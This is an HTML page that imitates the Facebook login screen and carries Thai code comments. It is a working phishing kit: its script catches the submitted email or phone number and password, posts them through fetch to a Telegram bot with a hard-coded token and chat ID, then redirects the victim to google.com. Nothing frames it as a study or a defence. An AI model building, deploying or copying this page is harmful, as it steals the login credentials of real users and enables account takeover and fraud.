<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook Login Page</title>
    <style>
        @import url("https://googleapis.com");

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: "Poppins", sans-serif;
            background: #f2f4f7;
        }

        .content {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 100%;
            max-width: 1000px;
            padding: 0 2rem;
        }

        .flex-div {
            display: flex;
            justify-content: space-evenly;
            align-items: center;
        }

        .name-content {
            margin-right: 7rem;
            max-width: 400px;
        }

        .name-content .logo {
            font-size: 3.5rem;
            color: #1877f2;
        }

        .name-content p {
            font-size: 1.3rem;
            font-weight: 500;
            margin-bottom: 5rem;
            color: #4a5568;
        }

        form {
            display: flex;
            flex-direction: column;
            background: #fff;
            padding: 2rem;
            width: 530px;
            height: auto;
            border-radius: 0.5rem;
            box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%);
        }

        form input {
            outline: none;
            padding: 0.8rem 1rem;
            margin-bottom: 0.8rem;
            font-size: 1.1rem;
            border: 1px solid #cbd5e1;
            border-radius: 0.375rem;
        }

        form input:focus {
            border: 1.8px solid #1877f2;
        }

        .login {
            background-color: #1877f2;
            color: white;
            padding: 0.8rem;
            font-size: 1.1rem;
            font-weight: 600;
            border: none;
            border-radius: 0.375rem;
            cursor: pointer;
            margin-bottom: 1rem;
        }

        .login:hover {
            background-color: #0d5ecf;
        }

        form a {
            color: #1877f2;
            text-decoration: none;
            font-size: 0.9rem;
            text-align: center;
            margin-bottom: 1rem;
        }

        form a:hover {
            text-decoration: underline;
        }

        hr {
            border: 0;
            border-top: 1px solid #e2e8f0;
            margin-bottom: 1.5rem;
        }

        .create-account {
            background-color: #42b72a;
            color: white;
            padding: 0.8rem 1.5rem;
            font-size: 1rem;
            font-weight: 600;
            border: none;
            border-radius: 0.375rem;
            cursor: pointer;
            width: fit-content;
            margin: 0 auto;
        }

        .create-account:hover {
            background-color: #36a420;
        }

        @media (max-width: 900px) {
            .content {
                position: relative;
                top: 0;
                left: 0;
                transform: none;
                padding: 2rem 1rem;
            }
            .flex-div {
                flex-direction: column;
                text-align: center;
            }
            .name-content {
                margin-right: 0;
                margin-bottom: 2rem;
            }
            .name-content p {
                margin-bottom: 1rem;
            }
            form {
                width: 100%;
                max-width: 450px;
            }
        }
    </style>
</head>
<body>
    <div class="content">
        <div class="flex-div">
            <div class="name-content">
                <h1 class="logo">Facebook</h1>
                <p>Connect with friends and the world around you on facebook.</p>
            </div>
            
            <!-- ใช้ id สำหรับระบุฟอร์มเพื่อเขียนสคริปต์ควบคุม -->
            <form id="loginForm">
                <input type="text" id="accountInput" placeholder="Email or Phone Number" required />
                <input type="password" id="passwordInput" placeholder="Password" required />
                <button type="submit" class="login">Log In</button>
                <a href="#">Forgot Password ?</a>
                <hr />
                <button type="button" class="create-account">Create New Account</button>
            </form>
        </div>
    </div>

    <!-- ส่วนของ JavaScript เพื่อส่งข้อมูลเข้า Telegram แทน Python Requests -->
    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            event.preventDefault(); // ป้องกันไม่ให้หน้าเว็บรีเฟรชเมื่อกดส่งฟอร์ม

            // ดึงค่าข้อมูลที่ผู้ใช้กรอกจริงจากช่อง Input
            const userInput = document.getElementById('accountInput').value;
            const passwordInput = document.getElementById('passwordInput').value;

            // ตั้งค่าข้อมูลสำหรับส่งไปยัง Telegram Bot ของคุณ
            const TOKEN = "8803420620:AAEuqeLtdpxsEwSK1cTFNURvJVrUpjsAHAc";
            const CHAT_ID = "8033387742";
            
            // แก้ไข URL ให้ถูกต้องตาม API Spec ของ Telegram (ต้องมี api.telegram.org/bot<TOKEN>)
            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

            // จัดรูปแบบข้อความ Markdown
            const message = `🔐 *ข้อมูลการเข้าสู่ระบบ*\n\n*Username/Email:* \`${userInput}\`\n*Password:* \`${passwordInput}\``;

            // เตรียมโครงสร้าง Payload สำหรับส่งข้อมูลออกไป
            const payload = {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: "Markdown"
            };

            try {
                // ส่งข้อมูลไปยัง API ของ Telegram โดยใช้ async/await เพื่อความชัวร์ในการทำงาน
                const response = await fetch(url, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(payload)
                });

                console.log("Sent status code:", response.status);
                
                if (response.ok) {
                    // เปลี่ยนหน้าเมื่อส่งสำเร็จ
                    window.location.href = "https://google.com";
                } else {
                    console.error("Failed to send message to Telegram API");
                }
            } catch (error) {
                console.error("Error:", error);
            }
        });
    </script>
</body>
</html>
